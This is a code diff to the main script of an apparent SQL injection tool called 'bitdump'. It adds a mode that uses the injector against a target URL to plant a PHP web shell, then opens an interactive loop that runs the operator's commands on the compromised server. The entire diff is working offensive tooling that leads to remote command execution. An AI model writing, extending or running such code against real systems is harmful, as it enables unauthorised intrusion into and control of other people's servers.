@@ -45,13 +45,41 @@ if __name__ == '__main__':
     verbosity = 0 if p.args.verbose is None else p.args.verbose
     printer = Printer(verbosity, p.args.outfile)
 
-    if p.args.file is None:            
+    if p.args.shell is not None:
+        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
+        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
+        try:
+            print("Loading injector...")
+            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor)
+        except injection.InjectionError:
+            print("Failed injection! Are you sure your settings are correct?")
+            exit(ERR_INJECTION)
+        except injection.TimeoutLimitError as e:
+            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
+            exit(ERR_TIMEOUT)
+        else:
+            print("Generating shell...")
+            shell = injector.injectPHPShell(p.args.shell)
+        finally:
+            stringExecutor.shutdown()
+            charExecutor.shutdown()
+        output = shell.prompt()
+        done = False
+        while not done:
+            cmd = input(output)
+            if cmd == "exit":
+                print("[bitdump] exiting")
+                done = True
+            else:
+                output = shell.execute(cmd)
+    elif p.args.file is None:
         stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
         charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.8), 1))
         tableExecutor = None
         recordExecutor = None
 
         try:
+            print("Loading injector...")
             injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor)
         except injection.InjectionError:
             print("Failed injection! Are you sure your settings are correct?")
